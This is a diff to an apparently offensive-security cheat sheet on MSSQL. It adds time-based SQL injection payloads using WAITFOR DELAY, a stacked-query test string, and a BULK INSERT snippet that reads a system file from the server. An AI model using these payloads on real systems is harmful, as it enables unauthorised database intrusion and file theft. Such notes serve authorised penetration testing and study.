@@ -45,6 +45,11 @@
     ' if (select user) = 'sa' waitfor delay '0:0:5'--
     ' if (select user) != 'sa' waitfor delay '0:0:5'--
     ```
+    ```
+    WAITFOR DELAY '0:0:5'
+    ```
+  - Check support for stacked queries: `-1" AND 1=2; WAITFOR DELAY '0:0:5'; -- "`
+
 
 ## Tools 
 
@@ -315,7 +320,12 @@ CREATE LOGIN ... WITH PASSWORD = ...;
     from sys.databases
     ```
 - <https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql>
-
+- Read file: 
+    ```sql
+    CREATE TABLE mydata (line varchar(8000));
+    BULK INSERT mydata FROM 'c:\windows\win.ini';
+    SELECT line FROM mydata;
+    ```
 ## Brute-forcing
 
 - Check if current domain user has access to DB
